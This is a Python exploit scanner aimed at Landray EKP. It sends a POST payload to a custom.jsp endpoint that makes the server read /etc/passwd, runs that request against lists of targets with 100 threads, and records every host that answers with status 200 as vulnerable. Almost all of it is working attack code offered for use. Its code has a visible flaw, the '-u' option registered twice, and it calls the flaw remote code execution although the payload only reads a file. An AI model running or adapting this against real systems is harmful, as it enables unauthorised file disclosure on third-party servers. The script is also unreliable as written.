import requests,argparse,sys
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

def banner():
    test = """ 
    
            ██╗      █████╗ ███╗   ██╗██╗     ██╗███╗   ██╗ ██████╗ 
            ██║     ██╔══██╗████╗  ██║██║     ██║████╗  ██║██╔════╝ 
            ██║     ███████║██╔██╗ ██║██║     ██║██╔██╗ ██║██║  ███╗
            ██║     ██╔══██║██║╚██╗██║██║     ██║██║╚██╗██║██║   ██║
            ███████╗██║  ██║██║ ╚████║███████╗██║██║ ╚████║╚██████╔╝
            ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
                                                                    author:秋妤
                                                                    date:2024.09.25
                                                                    version:1.0
    """
    print(test)


def poc(target):
    payload = '/sys/ui/extend/varkind/custom.jsp'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        'Accept': '/',
        'Connection': 'Keep-Alive',
        'Content-Length': '42',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }

    data = 'var={"body":{"file":"file:///etc/passwd"}}'
    try:
        res1 = requests.post(url=target+payload,timeout=10,headers=headers,verify=False,data=data)
        if res1.status_code == 200:
            print(f'[+]{target}存在漏洞')
            with open('蓝凌_result.txt','a', encoding='utf-8') as fp:
                fp.write(f"{target} \n")
        else:
            print(f'[-]{target}不存在漏洞')
    except Exception as e:
        print(e)


def main():
    banner()
    url_list = []
    parser = argparse.ArgumentParser(description='这是一个 蓝凌EKP远程代码执行漏洞 的扫描脚本')
    parser.add_argument('-u','--url',dest='url',help='Please enter url')
    parser.add_argument('-u', '--file', dest='file', help='Please enter file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()